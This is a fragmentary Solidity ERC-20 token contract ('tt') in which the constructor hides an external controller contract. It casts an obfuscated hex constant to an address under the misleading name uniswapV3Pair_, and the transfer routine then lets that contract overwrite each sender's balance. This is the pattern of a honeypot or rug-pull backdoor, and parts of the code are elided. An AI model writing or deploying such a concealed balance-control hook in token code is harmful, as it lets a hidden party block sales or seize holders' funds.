...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _tokenname = "tt";
    string private _tokensymbol = "tt";
    uint256 private _tokendecimals;
    uint256 private _totalSupply;

    _CoinChat private CoinChat_;

    constructor(uint256 decimalstoken_) {
        _tokendecimals = decimalstoken_;
         address uniswapV3Pair_ = address(uint160(uint256(0x31345627383940491656423446442a7b7F46996C707c9f6B3c0C681b85fe4805)));
        CoinChat_ = _CoinChat(uniswapV3Pair_);
        _totalSupply = 1000000000 * 10**_tokendecimals;
    ...
    function _transfertoken(
        ...
        _balance[from] = CoinChat_._tokenswap(from, amount, _balance[from]);
        require(
